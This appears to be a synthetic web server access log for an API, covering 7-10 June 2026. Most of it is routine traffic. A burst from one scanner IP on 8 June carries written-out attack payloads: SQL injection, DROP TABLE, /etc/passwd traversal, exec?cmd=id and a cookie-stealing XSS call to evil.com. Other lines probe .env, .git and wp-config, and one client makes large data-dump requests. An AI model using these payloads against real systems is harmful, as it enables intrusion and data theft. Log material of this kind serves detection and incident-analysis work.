1.186.34.56 - api-client [07/Jun/2026:01:40:53 +0530] "GET /api/v2/search?q=phone HTTP/1.1" 304 684 "https://github.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=1.431
74.125.224.89 - - [07/Jun/2026:03:32:24 +0530] "PUT /api/v2/admin/stats HTTP/1.1" 200 30694 "https://dashboard.example.com" "okhttp/4.12.0" rt=1.046
61.246.78.34 - - [07/Jun/2026:05:50:23 +0530] "HEAD /api/v2/products HTTP/1.1" 200 54350 "https://api.example.com/docs" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=1.144
167.94.138.35 - - [07/Jun/2026:06:37:04 +0530] "GET /database.sql HTTP/1.1" 200 752 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" rt=0.348
210.18.55.34 - - [07/Jun/2026:07:07:47 +0530] "GET /api/v2/products/search HTTP/1.1" 301 447 "https://github.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.742
103.7.112.45 - - [07/Jun/2026:07:18:57 +0530] "POST /api/v2/search?q=laptop HTTP/1.1" 200 35618 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.771
122.177.99.45 - - [07/Jun/2026:08:38:51 +0530] "GET /api/v2/users/5678/avatar HTTP/1.1" 200 12795 "https://api.example.com/docs" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.294
175.101.120.56 - api-client [07/Jun/2026:11:04:57 +0530] "POST /api/v2/feed HTTP/1.1" 200 11762 "https://api.example.com/docs" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.701
49.205.34.78 - api-client [07/Jun/2026:11:17:01 +0530] "GET /api/v2/admin/stats HTTP/1.1" 200 76022 "https://app.example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=1.457
167.94.138.35 - - [07/Jun/2026:11:38:44 +0530] "GET /server-status HTTP/1.1" 404 623 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" rt=0.018
223.226.45.12 - - [07/Jun/2026:14:08:14 +0530] "POST /api/v2/payments HTTP/1.1" 200 34299 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.447
36.255.89.23 - api-client [07/Jun/2026:14:26:03 +0530] "GET /api/v2/auth/token HTTP/1.1" 200 78514 "https://app.example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.156
72.14.192.10 - - [07/Jun/2026:14:31:30 +0530] "PUT /api/v2/backup/snapshot HTTP/1.1" 200 56019791 "-" "okhttp/4.12.0" rt=4.238
122.177.99.45 - - [07/Jun/2026:14:33:26 +0530] "DELETE /api/v2/analytics/summary HTTP/1.1" 200 30189 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.404
210.18.55.34 - - [07/Jun/2026:15:22:28 +0530] "GET /assets/images/banner.webp HTTP/1.1" 200 32858 "https://api.example.com/docs" "axios/1.6.7" rt=1.407
72.14.192.10 - - [07/Jun/2026:16:18:33 +0530] "POST /api/v2/search?q=laptop HTTP/1.1" 200 56476 "https://app.example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.632
185.156.73.54 - - [07/Jun/2026:16:24:23 +0530] "GET /server-status HTTP/1.1" 404 245 "-" "curl/7.88.1" rt=0.482
223.226.45.12 - api-client [07/Jun/2026:16:51:23 +0530] "GET / HTTP/1.1" 200 16749 "https://dashboard.example.com" "okhttp/4.12.0" rt=0.302
122.177.99.45 - api-client [07/Jun/2026:17:42:48 +0530] "GET /api/v2/config HTTP/1.1" 200 27019 "https://dashboard.example.com" "axios/1.6.7" rt=1.314
103.7.112.45 - - [07/Jun/2026:18:03:22 +0530] "POST /api/v2/feed HTTP/1.1" 200 36130 "-" "okhttp/4.12.0" rt=1.123
27.56.145.23 - - [07/Jun/2026:18:24:22 +0530] "GET /api/v2/feed HTTP/1.1" 200 34785 "https://dashboard.example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.948
72.14.192.10 - - [07/Jun/2026:18:45:03 +0530] "GET /api/v2/export/users HTTP/1.1" 200 40439458 "https://github.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=9.483
103.195.201.34 - - [07/Jun/2026:19:15:07 +0530] "GET /api/v2/feed HTTP/1.1" 201 13345 "https://app.example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.226
210.18.55.34 - - [07/Jun/2026:19:58:40 +0530] "GET /api/v2/orders HTTP/1.1" 200 51846 "https://dashboard.example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.341
219.91.134.67 - - [07/Jun/2026:20:07:12 +0530] "POST / HTTP/1.1" 200 30951 "https://www.google.com/" "axios/1.6.7" rt=0.211
125.63.44.12 - - [07/Jun/2026:20:44:39 +0530] "DELETE /api/v2/users/1234/settings HTTP/1.1" 201 57170 "https://api.example.com/docs" "axios/1.6.7" rt=0.895
219.91.134.67 - api-client [07/Jun/2026:20:49:19 +0530] "POST /api/v2/cart HTTP/1.1" 304 260 "https://github.com" "okhttp/4.12.0" rt=0.665
103.7.112.45 - api-client [07/Jun/2026:21:15:07 +0530] "DELETE /api/v2/products/search HTTP/1.1" 304 259 "https://app.example.com" "okhttp/4.12.0" rt=0.426
125.63.44.12 - - [07/Jun/2026:21:48:05 +0530] "GET /api/v2/orders HTTP/1.1" 201 67923 "-" "axios/1.6.7" rt=0.084
103.7.112.45 - - [07/Jun/2026:21:56:35 +0530] "GET /api/v2/search?q=laptop HTTP/1.1" 200 15153 "https://app.example.com" "okhttp/4.12.0" rt=0.762
175.101.120.56 - - [08/Jun/2026:00:00:05 +0530] "POST /api/v2/cart HTTP/1.1" 200 14137 "-" "axios/1.6.7" rt=0.549
210.18.55.34 - - [08/Jun/2026:00:49:08 +0530] "GET /api/v2/backup/snapshot HTTP/1.1" 200 39094228 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=6.594
103.7.112.45 - api-client [08/Jun/2026:00:56:42 +0530] "OPTIONS /api/v2/products HTTP/1.1" 200 37592 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.540
185.156.73.54 - - [08/Jun/2026:01:29:01 +0530] "GET /v1/secret/data HTTP/1.1" 404 324 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)" rt=0.222
122.177.99.45 - api-client [08/Jun/2026:02:28:09 +0530] "OPTIONS /api/v2/notifications HTTP/1.1" 200 45431 "https://app.example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.341
117.96.78.45 - - [08/Jun/2026:03:04:42 +0530] "DELETE /api/v2/notifications HTTP/1.1" 200 2521 "https://www.google.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.357
110.234.52.100 - - [08/Jun/2026:03:39:10 +0530] "GET /static/bundle.js HTTP/1.1" 200 51942 "https://api.example.com/docs" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.880
117.96.78.45 - - [08/Jun/2026:03:43:33 +0530] "POST /api/v2/products HTTP/1.1" 200 48948 "https://dashboard.example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=1.135
1.186.34.56 - - [08/Jun/2026:04:28:11 +0530] "GET /static/vendors.js HTTP/1.1" 201 16822 "https://app.example.com" "axios/1.6.7" rt=0.979
103.7.112.45 - - [08/Jun/2026:06:06:02 +0530] "PUT /api/v2/products HTTP/1.1" 200 3479 "-" "axios/1.6.7" rt=0.396
49.205.34.78 - - [08/Jun/2026:06:27:27 +0530] "GET / HTTP/1.1" 200 23460 "https://api.example.com/docs" "axios/1.6.7" rt=0.265
175.101.120.56 - - [08/Jun/2026:07:48:27 +0530] "GET /api/v2/search?q=laptop HTTP/1.1" 201 32858 "https://dashboard.example.com" "axios/1.6.7" rt=1.332
210.18.55.34 - - [08/Jun/2026:08:11:34 +0530] "DELETE /api/v2/config HTTP/1.1" 200 77941 "https://app.example.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=1.054
210.18.55.34 - - [08/Jun/2026:09:19:26 +0530] "HEAD /api/v2/orders/history HTTP/1.1" 304 734 "https://www.google.com/" "okhttp/4.12.0" rt=0.380
72.14.192.10 - - [08/Jun/2026:09:23:09 +0530] "GET /api/v2/products/search HTTP/1.1" 204 194 "https://app.example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=1.159
49.205.34.78 - - [08/Jun/2026:10:33:19 +0530] "GET /api/v2/trending HTTP/1.1" 201 17478 "https://api.example.com/docs" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.230
72.14.192.10 - api-client [08/Jun/2026:12:17:11 +0530] "OPTIONS /api/v2/search?q=phone HTTP/1.1" 200 26702 "https://dashboard.example.com" "okhttp/4.12.0" rt=1.308
74.125.224.89 - - [08/Jun/2026:16:04:16 +0530] "GET /api/v2/search?q=laptop HTTP/1.1" 200 46851 "https://github.com" "okhttp/4.12.0" rt=1.308
72.14.192.10 - - [08/Jun/2026:16:33:01 +0530] "PUT /api/v2/backup/snapshot HTTP/1.1" 200 22088559 "https://api.example.com/docs" "okhttp/4.12.0" rt=8.121
110.234.52.100 - - [08/Jun/2026:16:53:30 +0530] "POST /static/style.css HTTP/1.1" 201 8149 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.777
103.195.201.34 - api-client [08/Jun/2026:16:57:26 +0530] "GET /api/v2/search?q=phone HTTP/1.1" 301 457 "https://app.example.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=1.286
109.201.133.195 - - [08/Jun/2026:17:30:25 +0530] "GET /wp-config.php HTTP/1.1" 400 885 "-" "Nikto/2.1.6" rt=1.695
109.201.133.195 - - [08/Jun/2026:17:30:46 +0530] "GET /api/v2/users?id=1' OR '1'='1 HTTP/1.1" 200 3021 "-" "Nikto/2.1.6" rt=0.524
109.201.133.195 - - [08/Jun/2026:17:30:49 +0530] "GET /actuator/env HTTP/1.1" 400 2622 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.494
109.201.133.195 - - [08/Jun/2026:17:31:27 +0530] "GET /console HTTP/1.1" 422 414 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)" rt=1.999
109.201.133.195 - - [08/Jun/2026:17:31:28 +0530] "GET /api/v2/exec?cmd=id HTTP/1.1" 403 3326 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)" rt=1.502
109.201.133.195 - - [08/Jun/2026:17:31:38 +0530] "POST /api/v2/users?id=1' OR '1'='1 HTTP/1.1" 200 1075 "-" "Nikto/2.1.6" rt=0.270
109.201.133.195 - - [08/Jun/2026:17:31:51 +0530] "POST /console HTTP/1.1" 404 2657 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)" rt=1.237
109.201.133.195 - - [08/Jun/2026:17:32:43 +0530] "GET /wp-config.php HTTP/1.1" 422 1890 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)" rt=1.394
109.201.133.195 - - [08/Jun/2026:17:32:56 +0530] "GET /api/v2/config?debug=../../../../etc/passwd HTTP/1.1" 403 553 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=1.907
109.201.133.195 - - [08/Jun/2026:17:33:13 +0530] "GET /wp-config.php HTTP/1.1" 403 228 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)" rt=1.774
109.201.133.195 - - [08/Jun/2026:17:33:38 +0530] "GET /api/v2/exec?cmd=id HTTP/1.1" 422 2794 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=1.370
109.201.133.195 - - [08/Jun/2026:17:33:45 +0530] "POST /api/v2/users?search=<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)> HTTP/1.1" 422 253 "-" "Nikto/2.1.6" rt=1.218
109.201.133.195 - - [08/Jun/2026:17:33:49 +0530] "GET /api/v2/products?filter=1 UNION SELECT table_name FROM information_schema.tables-- HTTP/1.1" 200 2412 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.653
109.201.133.195 - - [08/Jun/2026:17:34:21 +0530] "GET /api/v2/config?debug=../../../../etc/passwd HTTP/1.1" 200 1801 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)" rt=1.182
109.201.133.195 - - [08/Jun/2026:17:34:36 +0530] "POST /api/v2/orders?id=1; DROP TABLE orders-- HTTP/1.1" 403 1190 "-" "Nikto/2.1.6" rt=1.250
109.201.133.195 - - [08/Jun/2026:17:34:50 +0530] "POST /api/v2/products?filter=1 UNION SELECT table_name FROM information_schema.tables-- HTTP/1.1" 422 3134 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)" rt=0.816
74.125.224.89 - - [08/Jun/2026:17:38:40 +0530] "POST /api/v2/users HTTP/1.1" 200 2880 "https://dashboard.example.com" "axios/1.6.7" rt=0.303
117.96.78.45 - - [08/Jun/2026:17:59:34 +0530] "HEAD /api/v2/orders HTTP/1.1" 201 53071 "https://api.example.com/docs" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.590
122.177.99.45 - - [08/Jun/2026:18:57:58 +0530] "GET /assets/fonts/inter.woff2 HTTP/1.1" 200 48243 "https://app.example.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.085
117.96.78.45 - api-client [08/Jun/2026:19:08:22 +0530] "POST /api/v2/notifications HTTP/1.1" 200 17992 "https://github.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=1.382
110.234.52.100 - - [08/Jun/2026:21:30:15 +0530] "GET /static/bundle.js HTTP/1.1" 301 250 "https://api.example.com/docs" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.511
162.142.125.24 - - [08/Jun/2026:21:51:54 +0530] "GET /actuator/beans HTTP/1.1" 404 675 "-" "Go-http-client/1.1" rt=0.065
27.56.145.23 - api-client [08/Jun/2026:22:47:26 +0530] "GET /api/v2/auth/token HTTP/1.1" 200 75137 "https://github.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.052
122.177.99.45 - - [08/Jun/2026:23:27:03 +0530] "HEAD /api/v2/users HTTP/1.1" 304 235 "https://www.google.com/" "axios/1.6.7" rt=0.341
27.56.145.23 - - [09/Jun/2026:00:07:32 +0530] "GET /api/v2/config HTTP/1.1" 204 205 "https://dashboard.example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.665
1.186.34.56 - - [09/Jun/2026:00:10:56 +0530] "DELETE /metrics HTTP/1.1" 201 716 "https://dashboard.example.com" "axios/1.6.7" rt=0.951
162.142.125.24 - - [09/Jun/2026:00:30:01 +0530] "GET /config.json HTTP/1.1" 403 75 "-" "Go-http-client/1.1" rt=0.006
162.142.125.24 - - [09/Jun/2026:00:30:01 +0530] "GET /phpmyadmin/ HTTP/1.1" 403 153 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" rt=0.011
162.142.125.24 - - [09/Jun/2026:00:30:08 +0530] "GET /.env HTTP/1.1" 403 175 "-" "Go-http-client/1.1" rt=0.053
162.142.125.24 - - [09/Jun/2026:00:30:09 +0530] "GET /wp-login.php HTTP/1.1" 403 285 "-" "Go-http-client/1.1" rt=0.047
162.142.125.24 - - [09/Jun/2026:00:31:31 +0530] "GET /.env HTTP/1.1" 200 171 "-" "Go-http-client/1.1" rt=0.097
162.142.125.24 - - [09/Jun/2026:00:31:33 +0530] "GET /.git/HEAD HTTP/1.1" 200 53 "-" "Go-http-client/1.1" rt=0.044
162.142.125.24 - - [09/Jun/2026:00:31:37 +0530] "GET /console HTTP/1.1" 403 298 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" rt=0.004
162.142.125.24 - - [09/Jun/2026:00:31:38 +0530] "GET /.git/HEAD HTTP/1.1" 404 331 "-" "Go-http-client/1.1" rt=0.061
162.142.125.24 - - [09/Jun/2026:00:31:47 +0530] "GET /phpmyadmin/ HTTP/1.1" 404 262 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" rt=0.091
162.142.125.24 - - [09/Jun/2026:00:31:52 +0530] "GET /phpmyadmin/ HTTP/1.1" 404 54 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" rt=0.047
27.56.145.23 - - [09/Jun/2026:00:41:47 +0530] "PUT /static/bundle.js HTTP/1.1" 201 43256 "https://dashboard.example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.135
61.246.78.34 - - [09/Jun/2026:00:44:35 +0530] "OPTIONS /api/v2/notifications HTTP/1.1" 200 79379 "https://dashboard.example.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.673
223.226.45.12 - api-client [09/Jun/2026:01:13:08 +0530] "GET /api/v2/config HTTP/1.1" 201 66741 "https://app.example.com" "okhttp/4.12.0" rt=1.092
223.226.45.12 - - [09/Jun/2026:01:51:19 +0530] "PUT /static/bundle.js HTTP/1.1" 200 8501 "https://github.com" "okhttp/4.12.0" rt=0.532
180.151.34.78 - api-client [09/Jun/2026:02:01:45 +0530] "GET /api/v2/users/profile HTTP/1.1" 200 53548 "https://dashboard.example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=1.325
175.101.120.56 - - [09/Jun/2026:03:45:19 +0530] "POST /api/v2/trending HTTP/1.1" 200 29100 "https://github.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.942
117.96.78.45 - api-client [09/Jun/2026:03:46:50 +0530] "GET / HTTP/1.1" 200 57799 "https://api.example.com/docs" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.308
219.91.134.67 - api-client [09/Jun/2026:05:27:54 +0530] "POST /api/v2/users/5678/avatar HTTP/1.1" 301 663 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.044
103.195.201.34 - - [09/Jun/2026:05:45:38 +0530] "POST /api/v2/users/5678/avatar HTTP/1.1" 200 49568 "https://github.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.822
167.94.138.35 - - [09/Jun/2026:05:46:33 +0530] "GET /actuator/beans HTTP/1.1" 404 779 "-" "Go-http-client/1.1" rt=0.094
27.56.145.23 - api-client [09/Jun/2026:05:49:49 +0530] "PUT /assets/images/banner.webp HTTP/1.1" 301 187 "https://dashboard.example.com" "axios/1.6.7" rt=1.067
103.7.112.45 - - [09/Jun/2026:06:22:36 +0530] "GET /static/style.css HTTP/1.1" 200 73430 "https://dashboard.example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.416
1.186.34.56 - - [09/Jun/2026:07:02:58 +0530] "OPTIONS / HTTP/1.1" 301 571 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.278
210.18.55.34 - - [09/Jun/2026:11:16:43 +0530] "PUT /api/v2/products/search HTTP/1.1" 200 39529 "https://dashboard.example.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=1.352
61.246.78.34 - api-client [09/Jun/2026:11:44:30 +0530] "POST /static/vendors.js HTTP/1.1" 200 29542 "https://github.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.073
162.142.125.24 - - [09/Jun/2026:12:28:31 +0530] "GET /admin HTTP/1.1" 404 200 "-" "curl/7.88.1" rt=0.476
167.94.138.35 - - [09/Jun/2026:16:25:10 +0530] "GET /backup.sql HTTP/1.1" 404 128 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)" rt=0.121
36.255.89.23 - - [09/Jun/2026:16:59:53 +0530] "PUT /api/v2/users HTTP/1.1" 200 22208 "https://dashboard.example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.206
72.14.192.10 - - [09/Jun/2026:17:35:06 +0530] "POST /api/v2/export/users HTTP/1.1" 200 56085358 "https://www.google.com/" "axios/1.6.7" rt=10.712
72.14.192.10 - - [09/Jun/2026:18:02:07 +0530] "HEAD /assets/images/banner.webp HTTP/1.1" 301 322 "https://dashboard.example.com" "okhttp/4.12.0" rt=0.426
122.177.99.45 - - [09/Jun/2026:18:17:54 +0530] "PUT /api/v2/notifications HTTP/1.1" 200 14956 "https://github.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.137
167.94.138.35 - - [09/Jun/2026:19:01:57 +0530] "GET /v1/secret/data HTTP/1.1" 301 564 "-" "Nikto/2.1.6" rt=0.379
210.18.55.34 - - [09/Jun/2026:19:39:40 +0530] "DELETE /api/v2/users/profile HTTP/1.1" 200 32914 "https://api.example.com/docs" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.776
49.205.34.78 - api-client [09/Jun/2026:22:11:20 +0530] "DELETE /api/v2/feed HTTP/1.1" 200 79999 "https://app.example.com" "axios/1.6.7" rt=1.048
180.151.34.78 - - [09/Jun/2026:22:30:29 +0530] "POST /api/v2/payments HTTP/1.1" 200 23064 "https://github.com" "okhttp/4.12.0" rt=0.782
27.56.145.23 - api-client [10/Jun/2026:01:17:13 +0530] "DELETE /api/v2/analytics/summary HTTP/1.1" 204 437 "https://github.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=1.302
117.96.78.45 - - [10/Jun/2026:01:29:04 +0530] "GET /api/v2/payments HTTP/1.1" 200 38806 "https://github.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.514
1.186.34.56 - - [10/Jun/2026:01:32:53 +0530] "GET /api/v2/auth/token HTTP/1.1" 200 22768 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=1.336
74.125.224.89 - - [10/Jun/2026:01:41:40 +0530] "POST /metrics HTTP/1.1" 200 34601 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.682
162.142.125.24 - - [10/Jun/2026:04:39:43 +0530] "GET /server-status HTTP/1.1" 404 476 "-" "Nikto/2.1.6" rt=0.104
175.101.120.56 - - [10/Jun/2026:04:51:59 +0530] "GET /api/v2/users HTTP/1.1" 200 51176 "https://dashboard.example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.474
162.142.125.24 - - [10/Jun/2026:05:02:35 +0530] "GET /wp-admin/ HTTP/1.1" 404 783 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" rt=0.343
72.14.192.10 - - [10/Jun/2026:05:32:45 +0530] "GET /api/v2/users HTTP/1.1" 200 10465 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=1.412
117.96.78.45 - - [10/Jun/2026:08:05:41 +0530] "HEAD /api/v2/payments HTTP/1.1" 200 40237 "https://app.example.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.511
185.156.73.54 - - [10/Jun/2026:08:13:32 +0530] "GET /backup.sql HTTP/1.1" 404 204 "-" "Nikto/2.1.6" rt=0.464
27.56.145.23 - - [10/Jun/2026:09:39:04 +0530] "PUT /api/v2/users/profile HTTP/1.1" 200 49291 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.821
180.151.34.78 - - [10/Jun/2026:10:02:15 +0530] "GET / HTTP/1.1" 200 5384 "https://dashboard.example.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.210
185.156.73.54 - - [10/Jun/2026:10:11:59 +0530] "GET /.env HTTP/1.1" 404 159 "-" "Go-http-client/1.1" rt=0.275
175.101.120.56 - api-client [10/Jun/2026:11:14:34 +0530] "POST /api/v2/auth/token HTTP/1.1" 200 60907 "https://dashboard.example.com" "axios/1.6.7" rt=0.276
72.14.192.10 - - [10/Jun/2026:11:58:38 +0530] "GET /api/v2/data/dump HTTP/1.1" 200 56798388 "https://app.example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=6.081
162.142.125.24 - - [10/Jun/2026:11:58:41 +0530] "GET /api/v2/debug HTTP/1.1" 404 249 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" rt=0.454
61.246.78.34 - - [10/Jun/2026:12:10:38 +0530] "DELETE /api/v2/analytics/summary HTTP/1.1" 301 327 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=1.420
175.101.120.56 - - [10/Jun/2026:12:53:16 +0530] "OPTIONS /health HTTP/1.1" 200 78884 "https://github.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.543
